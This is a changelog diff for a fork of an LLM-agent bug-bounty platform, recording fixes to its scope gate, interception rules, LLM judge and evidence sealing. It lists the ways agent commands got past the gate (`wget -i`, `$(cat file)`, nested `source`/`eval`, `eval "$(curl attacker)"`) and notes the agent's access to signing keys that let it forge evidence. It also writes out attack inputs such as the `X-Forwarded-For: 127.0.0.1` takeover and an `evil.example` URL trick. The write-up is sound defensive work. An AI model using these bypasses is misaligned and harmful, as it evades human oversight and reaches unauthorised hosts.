@@ -2,7 +2,606 @@
 
 本项目的重要变更记录在此文件中，格式参考 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)。
 
+## v0.3.23-fix6 — 出站闸门补全、数组转义、平台 scope 导入
+
+本批解决的是「闸门看不见的目标」和「人手工抄 scope」两类问题。所有改动都有回归测试，
+并在真实实例上验证过。
+
+### 修复：目标流量不再绕过授权闸门
+
+`ProxyAddr()` 把「记录流量」和「经过闸门」绑在同一个开关上：`traffic_capture` 关闭时
+它直接把全局出口代理交给 agent，内置 MITM 完全不经过。本机部署正是这个状态——
+`traffic/_index/exchanges` 为 0 条，说明闸门跑了一周，一次请求都没看到。
+
+录制是观测选择，过闸门是安全选择。现在只要授权闸开着就一律走 MITM，是否落盘由
+`recordGate` 单独决定。`ProxyCACert()` 同步调整（MITM 两种模式下都重签证书，agent
+必须信任它），因此 `caCert` 不再能当作「是否录制」的信号——`workerSystem` 改为显式
+接收 `recording`，否则会给 agent 列出并不存在的 traffic 工具。
+
+实测（两项均为默认值：`scope_gate_enabled=true`、`traffic_capture` 未设置）：
+
+```
+范围内   http://127.0.0.1:18099  → 200
+范围外   http://example.com      → 403「请求未发出」
+落盘条数                          → 0
+```
+
+### 修复：内联程序与编译产物不再隐身
+
+- `python3 -c` / `node -e` / `ruby -e` 的内联正文此前不被捕获，理由是「judge 能从
+  Arguments 看到」；但授权闸只扫描 capture 返回的内容。现在正文作为内联脚本捕获。
+  顺带修掉一个连带误判：内联 Python 曾被当 shell 重新解析，`urlopen(` 触发语法错误，
+  导致每次 `python3 -c` 都被 fail-closed 误拦。
+- 直接执行的编译产物此前被静默丢弃，`./recon` 与「不碰网络」无法区分。8.7MB 的二进制
+  因超出快照上限被拦，15KB 的却一路放行——这个不对称是实测发现的。现在标记为
+  `Opaque`，未在命令行声明目标时拒绝。
+- `go run` 此前完全未建模，现按 opaque 处理。
+
+### 修复：PostgreSQL 数组字面量吞掉反斜杠
+
+`marshalStringArray` 只转义双引号，不转义反斜杠，而 PG 的数组解析器把 `\` 当转义符：
+
+```
+写入 {"a\b"}  →  存储结果 ab
+```
+
+影响 `bound_domains` / `record_value` / `technologies` 三个字段。同文件 13 行之前的
+`marshalJSONBArray` 早已正确转义，属漏改。现在两者共用 `quotePGArrayElement`。
+**已被吞掉的历史值无法反推**，需从上游重导。
+
+### 修复：5 个可达的 HTTP/2 DoS
+
+`golang.org/x/net v0.58.0 → v0.60.0`（连带 crypto/sys/text/mod/sync）。可达路径包括
+`traffic.Traffic.Start → http2.Server.ServeConn`。`govulncheck` 可达漏洞 5 → 0。
+
+### 新增：平台 scope 导入
+
+scope 此前只能手工录入。三个平台都发布机器可读的清单，手工转抄本身就是法律风险——
+抄错一个字符就授权了没人提供的主机。
+
+新增 `scopesync` 包解析 HackerOne / Bugcrowd / Intigriti 的导出，以及
+`POST /api/tasks/{id}/scope/import`：事务性替换，只动 `source='platform'` 的行，
+人工录入与目标拆解产生的内容原样保留。
+
+**排除规则优先于包含规则。** 三个平台都同时给出 in/out 两份清单，OR 起来等于把对方
+明确排除的主机重新授权。`excluded` 因此成为 `task_scope` 的一等字段。
+
+解析只做保守解释：仅当平台标注为 `DOMAIN` / `WILDCARD` 时才扩成域名树，裸主机保持
+精确匹配——放宽会授权平台从未提供的主机。无法识别的条目直接报错，不静默跳过。
+
+**只做了解析，没做请求。** 三个平台的端点契约未经核实，猜测的 URL 比没有更糟。
+实现方式是接收平台导出的 JSON。
+
+### 修复：旧归档恢复失败
+
+给 `task_scope` 加列时破坏了归档恢复：`json_populate_recordset` 对缺失字段返回 NULL，
+而 `excluded` 是 NOT NULL，任何加列之前写的归档都会恢复失败。改为显式列 + COALESCE。
+
+### 未启用：网络层强制
+
+`deploy/egress-lockdown.sh` 提供 uid 级 iptables REDIRECT：agent 命令降权到非 root
+uid 后，其 TCP 被强制送入 MITM，无视 `HTTP_PROXY` 也出不去。机制已在隔离容器验证
+（uid 10001 的直连被重定向，root 不受影响），但**未在部署环境启用**——需要改镜像
+（装 iptables/setpriv）、加 `CAP_NET_ADMIN`、并解决工作目录属主与 DNS 解析器地址。
+
+---
+
+## v0.3.23-fix5 — 拦截面默认收紧、拆解器扩权封堵、脚本嵌套解析
+
+**建议立即升级。** 本版交付两批修复：**27 项安全与正确性修复**（原计划作为
+`v0.3.23-fix4` 发布，未单独打标签，内容全部在本二进制中），加上本版新增的
+**3 项拦截面收紧**，合计 33 项。两批对应同一个二进制，Release 正文也是合并写的。
+
+第一批（见下方 `v0.3.23-fix4` 一节）关掉了授权闸的间接引用绕过；本版补上它留下的
+三个口子：拦截规则只覆盖 8 个工具、目标拆解器能把推导出来的主机登记成受信范围、
+脚本的嵌套入口不解析。三项都有端到端实测。
+
+### 拦截规则默认覆盖全部工具
+
+`intercept` 原先只对 `Bash/WebFetch/web_search/shell_open/shell_send/Write/Edit/MultiEdit`
+这 8 个名字求值。`delete_assets_by_host`（跨任务硬删全局资产）、`spawn_task`（启动
+真实 LLM 花费）、`create_custom_tool`、`create_mcp`、以及所有 `mcp__*` 工具**完全
+不在规则面内**——AGENTS.md 说「破坏性/外传门禁已下沉到 DB 规则」，但规则对它们从不
+触发。
+
+现在默认是「除只读工具外全部拦截」：新增 `interceptExemptTools` 白名单（25 个纯读
+或只写平台自身存储的工具，如 `list_assets`/`record_fact`/`add_intent`），其余一律
+进规则匹配。设置页的覆盖清单也从 8 项变成实际的 44 项，SDK 内置工具（无 tools 表
+记录）一并列出。
+
+保存过 `intercept_enabled_tools` 的部署不受影响——那是显式选择，仍然优先。
+
+### 目标拆解器不能再扩大授权边界
+
+拆解器读取的是操作员写的任务描述。它此前可以把**推导出来**的主机登记成
+`source=goals` 的可信 scope 行，而 `goals` 是授权闸认可的两个来源之一。实测：任务
+描述里只给了一段 base64，拆解器解码后把 `sneaky-host.example` 写进了 scope。
+
+现在只有**在任务描述或目标里原样出现**（忽略大小写，允许带 scheme/斜杠）的值才能
+登记为受信范围。推导出来的值直接拒绝并返回原因：
+
+```
+{"added":null,"errors":{"0":"该范围未在任务描述或目标中原样出现，不能作为可信授权范围登记：sneaky-host.example"}}
+```
+
+拒绝而不是静默降级为 `agent`，是为了让模型立刻知道边界没变，不会误以为自己已经扩权。
+
+### 脚本的嵌套入口
+
+`sh a.sh` 只解析 a.sh 本身。a.sh 里再 `source b.sh`、`eval '...'`、
+`echo x | xargs curl ...`、`find -exec` 调起的命令，全部不可见——判定器和授权闸
+都看不到里面真正要连的主机。
+
+现在 `source` 的脚本体、`eval` 的参数、`xargs`/`find -exec` 的尾部命令都递归解析
+（深度上限 4、总量上限 16 个展开，防自引用）。实测：
+
+```
+sh /tmp/nest/a.sh      (a.sh: source /tmp/nest/b.sh；b.sh: curl http://deep-target.example/)
+→ Blocked: 目标不在本任务授权范围内：deep-target.example
+```
+
+展开只对 shell 脚本生效：把 Python/JS 的正文当 shell 解析会产生语法错误，进而
+fail-closed 成「脚本不完整」，把正常调用误伤掉。命令自己生成的文件（`sed ... > new.sh`）
+也不重复展开——内容已经在快照里，再解析等于对数据做语法分析。
+
+### 验证
+
+- 6 文件 +323/−24，新增 1 个测试文件、2 组回归用例。
+- `go vet ./...` 干净；`go test -p 1 ./...` 15 包全绿（真实 PostgreSQL 18.6）。
+- 端到端（真实服务 + 真实 LLM）：
+  - 嵌套 source 目标被拦截，监听器 0 次连接；
+  - 拆解器两次尝试登记推导主机均被拒，任务 scope 保持为空；
+  - 覆盖清单 44 项，`delete_assets_by_host`/`spawn_task`/`create_custom_tool`/`create_mcp` 均在列，`record_fact`/`list_assets`/`add_intent` 保持豁免。
+
+### 已知未修
+
+`intercept` 的 shell 静态分析仍有理论绕过面（`nameref`、非常规 `IFS`、`hash -p`
+等），未逐条构造真实命令验证，不纳入本版。授权闸仍是「尽力提取 + 提取失败即阻断」
+的模型，对完全动态拼接的目标（`eval "$(curl attacker)"`）只能靠 fail-closed 兜底。
+
+## v0.3.23-fix4 — 未发布（内容并入 fix5）
+
+> **版本说明**：这部分内容提交后未单独打标签，随 `v0.3.23-fix5` 一起发布。
+> 下面记录的是它当时修掉的问题，保留以便追溯。
+
+本版修的是上一轮审计遗留的一条主线问题：**授权闸只认命令行里的
+字面主机名，认不出「间接引用」**。目标藏在目标清单文件、`sh -c` 的引号里、或者
+`$(cat file)` 里时，闸提取不到任何主机，于是放行 —— 而请求照常发出。
+
+这不是理论推导。用平台自己的 planner/worker 跑（deepseek-v4.1-flash），任务授权
+范围只给 `allowed.example`，越权目标只写在磁盘文件里，模型自己执行了四条命令，
+监听器每次都收到了连接：
+
+| 命令 | 修复前 | 修复后 |
+|---|---|---|
+| `wget -i /tmp/v1.txt` | 连上监听器 | 拦截：目标不在本任务授权范围内 |
+| `sh -c "wget -i /tmp/v1.txt"` | 连上 | 拦截 |
+| `curl "$(cat /tmp/v2.txt)"` | 连上 | 拦截 |
+| `wget -i "$(echo /tmp/v1.txt)"` | 连上 | 拦截 |
+
+修复后同一批命令 0 次连接。
+
+### 授权闸
+
+- **`wget -i` / `--input-file` 未登记为目标清单标志**，`wget` 读到的主机从未被检查。
+  已加入（仅限 wget：`curl -i` 是「包含响应头」，不能当成清单）。
+- **目标行整行取 `@` 后半段当主机**：`https://evil.example/?to=@in-scope.example`
+  被读成 in-scope.example，实际连的是 evil.example。改为只在 authority 段取 userinfo。
+- **`sh -c` / `bash -c` 的引号内容被当成一个 token**，里面的 `nuclei -l targets.txt`
+  永远读不到清单文件。现在递归重新分词（深度上限 4）。
+- **`$(cat FILE)` / `` `cat FILE` `` / `$(echo FILE)`** 不解析，命令替换出来的目标
+  完全不可见。现在递归解析替换内容并读取其中的文件。
+- **单标签目标只认硬编码工具名**：`openssl s_client -connect juice-shop:3000`、
+  `redis-cli -h juice-shop`、`socat - TCP:juice-shop:3000`、`grpcurl juice-shop:443`
+  全部放行。改为按位置判断，并新增 `-h/--host/-connect/--server` 等主机型标志提取。
+- **URL 解析失败被当成「没有目标」**：`net/url` 拒绝但 libcurl 接受的写法（如
+  `http://host%2e/`）直接放行。`hostFromURL` 改为返回 `(host, ok)`，解析失败时
+  `ExtractHostsChecked` 给出 fail-closed 理由，`scopeGateFor` 据此阻断。
+- **`-il` 被 GNU 短选项拆分逻辑打散**成 `-l` + `ist`，合法调用被误阻断；已修，
+  且结果不再依赖 map 迭代顺序。
+- **`> out.txt; cat out.txt`** 这种「先写再读自己的输出」被当成读取目标清单而误拦；
+  重定向写入目标现在从清单候选里排除。
+
+### 误伤修复（可用性）
+
+上一版闸会把**任何**工具调用里的字符串都扫一遍，导致：
+
+- `record_fact` 描述「bar.localhost:9317」被当成越权目标拦截，模型被迫把主机名写成
+  `bar[.]localhost` 才能写回自己的笔记；
+- `cat /etc/hosts` 被当成「读取目标清单」而 fail-closed。
+
+新增 `nonNetworkTools` 白名单（`record_fact`/`add_intent`/`list_assets`/`set_goals`
+等 25 个不发起网络请求的工具），这些工具的文本参数不再参与主机提取。
+
+### 审批与审计
+
+- **裁判判定被畸形回复整条丢弃**：模型回 `{"decision":"deny","comment":"...","confidence":0.95}`
+  或多一个键，解码失败 → 空判定 → 落到默认 `allow`。改为 `json.RawMessage` 解码，
+  deny/ask 一律保留；超长解释只截断不丢动作；`allow` 遇未知键或超长仍拒绝
+  （安全方向单向放宽）。
+- **审计日志把拦截记成放行**：`allow` 行原先写在所有判定之前，每次拦截都会同时留下
+  一条 `allow` 和一条 `block`。现在 `allow` 只在全部闸通过后写入。
+
+### 认证
+
+- **首启接管（实测）**：全新实例上 `POST /api/auth/init` 带
+  `Origin: https://evil.example` + `Content-Type: text/plain`，无需 setup token 即
+  返回 200，攻击者密码可直接登录。原因是 `isLoopbackRequest` 把「环回 peer 且无
+  转发头」当成本机，而 README 的 nginx 配置恰好不设 `X-Forwarded-For`。
+  新增 `isBrowserCrossSite`：浏览器带 `Origin`/`Sec-Fetch-Site` 的跨站请求一律拒绝；
+  命令行初始化不受影响。
+- **登录限流可绕过**：伪造 `X-Real-IP` 每次换桶，14 次错误密码全 401。不再信任该头；
+  同时修掉淘汰策略——原先淘汰的是「最老的桶」，而最老的桶正是已经饱和、正在限流的
+  那个，等于把攻击者的计数器清零。现在淘汰最新桶。
+- **令牌代数 fail-closed**：读失败时不再让 `tokenVer` 停在 0（0 正是首次登出/改密
+  之前所有令牌的代数，重启期 DB 抖动会复活已撤销令牌），改为 `tokenVerUnknown` +
+  503；`bumpTokenVersion` 在无 DB 时返回错误，不再让登出静默变成空操作。
+
+### 资产与数据
+
+- **DSL 的 OR 缺整体括号**：`(a) OR (b)` 之后调用方直接拼 `AND type=$N`，AND 优先级
+  更高，过滤只作用于最后一个分支。`list_assets` 的 `dsl="domain=a OR domain=b"` 因此
+  能返回**任务范围外**的资产（真实 PG 18 上验证过）。顶层子句现在整体加括号。
+- **DSL 运算符被静默丢弃**：`task_id>5` 生成 `= ANY(task_ids)`，`company_id>5` 变成
+  `= 5`，用户以为过滤生效了。现在只接受 `=`/`==`/`!=`，其余报错。
+- **资产拦截规则可被等价写法绕过**：`exact_ip` 用字符串比较，`::FFFF:203.0.113.5`
+  拦不住 `203.0.113.5`；`fuzzy_domain` 用子串匹配，白名单 `example.com` 会放行
+  `example.com.evil.net` 和 `notexample.com`。改为按解析后的地址比较 + 标签边界匹配。
+- **`toggle` 传 `{}` 会静默禁用内置拦截规则**：`Enabled bool` 无法区分「没传」和
+  `false`。改为 `*bool`，缺失即 400；创建默认启用，部分更新保留原值。
+- **公司范围 `{"reset":true}` 空列表清空全部授权**：需要显式 `confirm_empty:true`。
+- **DSN 脱敏泄漏密码**：libpq 关键字形式、解析失败的 URI、`?password=` 三种情形都
+  原样返回含密码的串，而它唯一的调用方就是启动错误日志。已全部打码。
+
+### 工作区隔离
+
+- **数据目录是符号链接时能删掉整个工作区**：`wsResolve` 返回解析后的真实路径，护栏
+  却拿它和词法路径比较，永远不相等。实测返回 200 并删光（含 `jwt.key`）。
+- **聊天附件上传跟随符号链接**：`filepath.Join` 不校验祖先，agent 可把
+  `sessions/<id>` 指向 `../../evidence`，操作员下次传附件就写进证据目录。
+  现在走 `wsResolveIn`（保留包含性校验、按需关闭机密子树黑名单）。
+- **工作区写入未做硬链接检查**：`ln jwt.key notes.txt` 后「编辑 notes.txt」会覆盖
+  签名密钥。
+
+### 通知与出站
+
+- **云元数据地址可达**：`100.100.100.200`（阿里云，在 100.64/10 里）和
+  `fd00:ec2::254`（AWS IPv6）不在拦截范围，实测能建成投递渠道。
+- **设了 `HTTP_PROXY` 就绕过 SSRF 守卫**：`Clone()` 保留 `ProxyFromEnvironment`，
+  拨号校验只看到代理 IP，目标 URL 由代理转发，URL 里的 token 也发给代理。已置空。
+- **https → http 降级重定向被放行**，凭据头会跟着走明文。现在同时比较 scheme。
+- **`/api/llm/models` 的 `proxy` 参数未校验**（第二处 SSRF 面），且客户端不限制
+  重定向。已按 `base_url` 同一套规则校验，并限制跳转次数与目标。
+
+### 任务收尾
+
+- **终局判定轮被压到 1 秒**：该轮只在 deadline 已过之后才跑，却仍携带过期的
+  `DeadlineUnix`，`clampMaxDuration` 把它压到 1s，harness 立刻以超时打断 ——
+  本已完成的任务被判成 timeout。终局轮不再携带 deadline。
+
+### 验证
+
+- 19 个文件，+739 / −86；新增 6 个回归测试文件（每个修复点都有断言）。
+- `go vet ./...` 干净；`go test ./...` 15 个包全绿（需 DB 的用例跑在真实 PostgreSQL 18.6）。
+- 端到端：真实服务 + 真实 LLM，四条绕过命令全部被拦，监听器 0 次连接；
+  接口级 8 项（首启 CSRF、限流、toggle、reset、附件符号链接、LLM proxy、
+  通知元数据、根删除）全部按预期拒绝，正常路径未受影响。
+
+### 已知未修（需运维决策）
+
+1. 拦截规则默认只覆盖 8 个工具名；`delete_assets_by_host`、`spawn_task`、
+   `create_custom_tool`、`create_mcp` 不在规则面内。
+2. 目标拆解器可以把主机写进 `goals` 来源的 scope（实测观察到一次）。这是设计上的
+   信任假设——拆解器读的是操作员写的任务描述；若描述可能被注入，这里就是扩权入口。
+3. `intercept` 的 shell 静态分析仍有 20+ 条理论绕过（`nameref`、`IFS`、`hash -p`
+   等），未逐条构造真实命令验证，不纳入本版。
+
+## v0.3.23-fix3 — 第二轮安全审计（74 项修复）
+
+**建议立即升级。** 本版交付第二轮安全审计的全部修复：**6 Critical / 47 High /
+18 Medium / 3 Low，共 74 项**。其中 4 项能被外部直接利用、或会让平台自己崩掉，
+2 项在 SRC 场景下是封号级风险。
+
+> **版本说明**：原本计划以 `v0.3.23-fix2` 发布，但那次 CI 的
+> `binaries (windows, amd64)` 失败（工作区加固用了 `syscall.O_NOFOLLOW` /
+> `syscall.Stat_t` 两个 Unix 专有符号），其余四个平台被连带取消，未产出任何 Release。
+> 本版修掉平台适配问题，内容与 fix2 完全一致。
+
+### 本版修掉的构建问题
+
+| 能力 | Unix | Windows |
+|---|---|---|
+| 拒绝多重硬链接 | `Stat_t.Nlink > 1` | `GetFileInformationByHandle` → `NumberOfLinks > 1` |
+| 不跟随符号链接写入 | `O_NOFOLLOW`（`ELOOP` 转成明确错误） | `FILE_FLAG_OPEN_REPARSE_POINT` |
+
+新增 `server/workspace_unix.go`、`server/workspace_windows.go`，`workspace.go` 只保留
+平台无关的调用。5 个发布目标全部交叉编译通过（`CGO_ENABLED=0`）。
+
+### 为什么必须升级
+
+| 问题 | 修复前会发生什么 |
+|---|---|
+| **证据链可伪造** | Agent 能读到证据签名密钥，凭空造一份「已复现漏洞」并通过官方闸门（实测输出 `verdict_allowed: reproduced`）。交到 HackerOne 等于伪造证据。 |
+| **远程接管全新实例** | 只需一个请求头 `X-Forwarded-For: 127.0.0.1` 就能跳过首启初始化令牌，把管理员密码设成自己的。 |
+| **开一次日志页就崩溃** | 日志页开关与后台打日志并发时触发 `send on closed channel`，panic 在 `log.Printf` 内部，无 recover，进程直接退出（实测 46ms 复现）。 |
+| **带端口的网址全被拦** | `https://host:8443` 会多解析出一个 `com` 目标，判定越权。操作员会误以为范围没配好，进而把授权闸关掉。 |
+
+### Critical
+
+- **日志页开关一次即崩溃**（`server/logsink.go`）：`add()` 在锁内快照订阅者、解锁后
+  发送，而退订闭包在锁内 `delete` 后立刻 `close(ch)`；两者交错触发
+  `send on closed channel`。panic 发生在 `log.Printf` 内部，调用方无 recover，进程直接
+  退出。改为锁内发送、锁内 close，两侧共享同一把锁。
+- **`X-Forwarded-For` 取最左值 → 首启 setup token 失效**（`server/auth_limit.go`、
+  `server/auth.go`）：nginx 的 `$proxy_add_x_forwarded_for` 把客户端自带值放在左边，
+  于是远程攻击者只需发 `X-Forwarded-For: 127.0.0.1` 就被判定为本机，跳过
+  `/api/auth/init` 的一次性令牌校验，直接设成自己的管理员密码。改为取**最右**跳
+  （本机反代追加的那一条），右侧不是合法 IP 时不再回退到左侧。
+- **`bumpTokenVersion` 的 `FOR UPDATE` 从未生效**（`server/auth.go`）：锁加在无 `FROM`
+  的外层查询上，`settings` 那一行完全没被锁，并发 bump 都读到 N 并写 N+1 —— 丢失更新，
+  改密/登出后旧令牌可能仍有效。改为先 `INSERT ... ON CONFLICT DO NOTHING` 保证行存在，
+  再 `SELECT ... FOR UPDATE`（实测第二个事务由 47ms 变为阻塞 3053ms）。
+- **带端口的 URL 多提取一个 TLD → 合法请求被拦**（`guard/scope.go`）：单标签
+  `host:port` 正则在原始文本上扫描，`api.example.com:8443` 额外匹配出 `com:8443`，
+  而 `com` 永远不在 `task_scope` 里。所有显式带端口的请求因此被判定越权。改为检查
+  匹配前的字节不属于主机名。
+- **`staticScriptPreparation` 接受不安全前置语句**（`intercept/shell_static.go`）：
+  只检查 `Background`，不看 `Negated` / `Redirs`，也跳过带 `Args` 的 `Assigns`。
+  `! cd /tmp`、`cd /tmp >"$(id)"`、`X=$(id) cd /tmp` 都被当成「目录已切换」，导致静态
+  分析看到的脚本路径与实际执行的不是同一个。三者一律拒绝。
+
+### High（授权与执行边界）
+
+- `guard/scope.go` host 提取重写：URL 用 `net/url` 解析（修 userinfo 被当作主机、
+  `[::1]:8080` 被破坏）、不再用 token/文件名启发式丢弃真实目标（`evil.zip`、
+  混合大小写标签）、单标签主机（`localhost`）无条件提取、新增**操作数扫描**（网络工具的
+  非 flag 参数即目标），并保证 URL 内文不再被二次扫描出多余主机。
+- `guard/scope_files.go`：`cat targets | httpx` 的 `filepath.Ext("")[1:]` panic；
+  tokenizer 按 shell 元字符切分（`cat f|httpx`、`-l f;cmd` 曾整条被丢弃）；
+  支持 `-l=FILE` / `--targets=FILE` / `-lFILE`；`@` 取右侧而非左侧；目录、FIFO、
+  设备节点、超大文件、超过行数上限、无法解析的行一律 fail-closed 而非静默返回空。
+- **脚本内容纳入授权闸**（新增 `guard.ScriptHosts` + `server/scope_gate.go`）：
+  之前闸门只看命令行，`python3 /tmp/recon.py` 的目标完全不可见，而平台的 Bash 提示词
+  正是建议「写个脚本再执行」。现在解析脚本正文（按行判断是否有网络调用，只认带引号的
+  主机与网络命令的操作数），读不完整即 fail-closed。
+- **自定义工具 / MCP 绕过 hook**（新增 `Server.gateCustomExecution`）：`runCommandTool`
+  与 `runScriptTool` 走 `actool.NewBash().Call` / `exec.Command`，不经过 PreToolUse，
+  于是授权闸与拦截规则全被跳过。执行前重跑同一套检查。
+- **证据密钥移出 agent 可达范围**：HMAC 密钥与记录器令牌不再镜像到 `/app/data`
+  （agent 的工作目录），`restore_to_runtime.sh` 只保留运行时树并删除数据目录副本；
+  `evidence_seal.py` 优先读运行时路径；新增内置拦截规则「读取平台签名密钥」覆盖
+  `.hmac-key` / `.recorder-token` / `setup-token` / `jwt.key`。
+- `server/workspace.go`：硬链接绕过（`ln .hmac-key innocent.txt` 后经 Web 可读）——
+  拒绝 `Nlink > 1`；FIFO/设备节点拒绝；`wsResolve` 返回**解析后**路径而非词法路径
+  （TOCTOU）；上传用 `O_NOFOLLOW` 且 `Lstat` 判占用。
+- `server/server_mgmt.go`：`/api/llm/models` 的 SSRF 与凭据外带 —— 校验 scheme 与
+  云元数据地址，且只在 `base_url` 与所选 profile 同主机时才复用已存 Key。
+- `server/update_settings.go`：更新令牌只发给首个请求的主机（注入式
+  RoundTripper 绕过了 net/http 的跨主机剥离）。
+- `server/platform_tools.go`：skill frontmatter 注入（`description` 含换行可注入
+  `mcps:` / `name:`）—— 新增 `yamlScalar`，仅对结构敏感值加引号转义；`create_mcp`
+  校验 transport/command/URL；`update_custom_tool` / `update_mcp` 改为与既有行合并，
+  不再用零值覆盖。
+- `notify/email.go`：`From` / `To` 含 CRLF 可注入额外头（Bcc）—— 一律拒绝控制字符。
+- `mcphttp/client.go`：SSE 端点必须是 `event: endpoint` 且与 SSE 同源（否则重绑到
+  任意主机会带着 `Authorization`）；头**值**也校验 CRLF；多行 `data:` 按规范用换行拼接。
+- `deploy/scripts/oobctl.sh`、`run_naabu.sh`：`source` agent 可写配置 = 命令执行
+  （`retention.sh` 上一版已修，这两处漏了）—— 改白名单 KEY=VALUE 解析。
+- `server/auth.go`：JWT key 读失败/过短不再静默重新生成（会吊销全部令牌）；
+  setup token 读取失败不再覆盖已下发的令牌。
+- `server/assembly.go`：工具表读取失败时不再把全部 host 工具交给 agent，
+  按 `privilegedToolKeys` 过滤（fail-closed）。
+- `server/finding_cases.go`：`caseHTTPError` 只把已知哨兵映射为 4xx，其余记日志并回 500
+  通用文案，不再回显驱动错误。
+
+### Medium / Low
+
+- `intercept`：规则加载失败改为 deny 而非放行；正则编译失败按「始终匹配」处理并记日志；
+  `intercept_enabled_tools` 损坏时回退内置默认；`ParseVerdict` 对格式不完美的
+  deny/ask 保留决定（allow 仍要求完整理由），同时拒绝重复 key 与第二个 JSON 对象。
+- `server/scheduler.go`：`mustState` 返回 `(value, ok)`，读失败跳过本轮而不是当作
+  「从未初始化」重放全部历史；播种查询失败不再写入 0。
+- `server/schedules.go`：`enabled` 缺省只在创建时默认 true，PATCH 不再重新启用已停用的计划。
+- `server/calendar_schedule.go`：畸形时间不再 panic；跨夜一次性计划（22:00→02:00）
+  的结束时间正确落到次日。
+- `server/customtool.go`：模板单遍替换（`{a}` 的值含 `{b}` 曾被二次展开）；
+  脚本超时/非零退出返回错误而非「成功」；代理地址非法时报错而不是静默直连。
+- `server/manager.go`：`decodeStrMap` 对 JSON `null` 返回非 nil map（曾在
+  `env["NODE_EXTRA_CA_CERTS"]` 处 panic）；`trafficOn` 在代理启动前加锁写入。
+- `server/basic_auth.go`：恒定时间比较用户名、始终执行 bcrypt、复用登录限流。
+- `server/assets.go`：资产增删加 2 MiB body 与 2000 条批量上限。
+- `server/auth_limit.go`：登录限流桶加硬上限（8192）并按最早过期淘汰。
+- `server/task_llm.go`：`agentsForTask` 的 bundle 缓存只按 task id 命中，Guard 被替换后
+  仍用旧 hooks。现在命中缓存时重新绑定 guard。
+- `db/notification.go`：没有启用渠道时不再把事件标记为已分派（否则期间的漏洞通知
+  永久丢失）。
+- `db/db.go`：新增内置拦截规则「读取平台签名密钥」（`intercept_default_rules_v4`）。
+- `evidence/verdict.go`：`CanonicalJSON` 与 Python 对 U+2028/U+2029 对齐，
+  否则 Go 侧验签会拒绝 Python 合法封印的证据包。
+- 新增 `guard` / `intercept` 回归测试，覆盖上述每条绕过。
+
+### 升级注意
+
+1. **首次启动会自动迁移证据密钥**：从 `/app/data/evidence/` 移到
+   `/usr/local/share/artex-src/`（后者权限 0400）。数据目录里的副本会被删除。
+   升级前如需保留，请先备份 `data/evidence/`。
+2. **部署脚本有改动**：`deploy/scripts/` 下 3 个脚本与
+   `skills/src-retest/scripts/evidence_seal.py` 需同步到容器（重建镜像，或同步
+   `skills/` 挂载点后重启）。
+3. **拦截规则新增一条**：升级后「拦截审批」页会多一条「读取平台签名密钥」，
+   默认启用。它拦截对 `.hmac-key` / `.recorder-token` / `setup-token` / `jwt.key`
+   的读取——这是有意的，不要为图方便关掉。
+4. **反代配置建议**：把 nginx 的 `proxy_set_header X-Forwarded-For
+   $proxy_add_x_forwarded_for;` 改成 `$remote_addr`。代码已能正确处理两种写法，
+   但覆盖式配置让这层信任关系更明确。
+
+## v0.3.23-fix2 — 未发布（构建失败，内容并入 fix3）
+
+CI 的 `binaries (windows, amd64)` 失败：
+
+```
+server/workspace.go:398: undefined: syscall.O_NOFOLLOW
+server/workspace.go:143: undefined: syscall.Stat_t
+```
+
+其余四个平台被 matrix 连带取消，未产出 Release。修复后的同一批改动以
+**`v0.3.23-fix3`** 发布，详见上一节。
+
+## v0.3.23-fix1 — 同步上游 v0.3.23 + 安全加固（审计发现逐条修复）
+
+### 上游同步
+- 合并 `RuoJi6/ARTEX` v0.3.23（b97472f..620ca5d）：任务情报（task_intelligence）、
+  凭据处理开关与流量卡片、拦截失败策略默认改为人工审批、任务归档 v4。
+- 冲突处理保留双方语义：settings 同时暴露本 fork 的 `scope_gate_enabled` /
+  `scope_trusted_sources` 与上游的情报/凭据开关；`record_intelligence` 可用，
+  但 `add_task_scope` 仍只给目标拆解器。
+- README 的许可章节采用上游版本，但把「仅限本地学习、禁止任何线上测试」改为与
+  本 fork 用途一致的「仅限已授权 SRC」。
+- **兜底裁判失败策略保持 `allow`**（上游改成 `ask`）：本 fork 无人值守运行，`ask` 会让
+  每个受影响调用挂 300 秒再被拒，既无安全收益又像卡死；授权边界由 fail-closed 的
+  scope 闸与内置破坏性规则保证，裁判只处理「未命中任何规则」的调用。失败时会写入
+  `judge_fallback` 活动（含错误原因）而不是静默降级。
+- **人工审批等待超时默认 300s → 120s**（`defaultJudgeAskTimeoutSecs`）：只影响模型
+  主动判「转人工」的调用，无人值守时缩短卡死时间，有人值守仍够点卡片；超时动作保持
+  `deny`。
+
+### 安全加固
+
+
+#### 授权边界
+- 授权闸从「只挂 worker」扩展到 **planner、任务主 Agent、以及能反查到任务的 chat 会话**
+  （`agent.Planner/MainAgent.SetHooks`、`server/task_llm.go`、`server/intercept.go`）。
+- `add_task_scope` 只允许目标拆解器写可信范围；主 Agent / planner 不再能自扩授权边界，
+  且该工具从两者的工具表中移除。
+- `company_scope` 增加 `source`；`task_scope.kind=company` 只展开 `manual`/`goals` 规则。
+- 范围匹配收紧：`subdomain` 精确匹配（不再覆盖子域）；`icp`/`keyword` 永不授权主机。
+- host 提取补齐短写 IPv4（`127.1`、`2130706433`、`0x7f000001`）与单标签 `host:port`
+  （`curl juice-shop:3000`）；仅当命令中出现网络工具时才采信单标签形式。
+
+#### 复测证据链
+- `record_finding_retest_result` 的 `reproduced`/`fixed` 必须带 `pack_dir`，服务端重算
+  HMAC 与证据指纹（`evidence/verdict.go`）；`inconclusive` 不要求证据包。
+- 修复 `ready` 不可达：challenge 改为由证据指纹推导，且被拒的 verdict 不再覆盖已签 gate。
+- `fixed` 必须有证据：空包 / 缺 case / WAF 页 / 超时一律只能 `inconclusive`。
+- compare 文件的 `pass` 只认封印 pack，断言用封印后的 case 现场复算。
+- 封印密钥不再接受环境变量指定的路径；`seal_case` 校验记录器身份，`verify_case` 拒绝
+  非授权封印；`http_evidence` / `browser_xss_evidence` 封印失败改为非零退出。
+- `evidence_gate` 校验 `pack.seal.json`，并用封印后的 body 复算字段级断言。
+- 靶场判定只看结构化 host：SSRF 载荷里的 `127.0.0.1` 不再把真实资产判成靶场；
+  `172.18.0.3.evil.com` 这类「私网前缀 + 域名」伪装仍判靶场。
+
+#### Skills 其它 fail-open 修复
+- `dup_check` / 判重查询：数据源不可用时退出码 4（未知≠没有重复），`report_check`
+  把 rc 4/其它非零都当问题。
+- `coverage_report`：读不到 findings、或空台账且未指定 `--assigned-risk` 时非零。
+- `report_check`：报告没有严重度段落时直接判失败；定级天花板加入否定词处理
+  （「no account takeover is possible」不再被判 critical）。
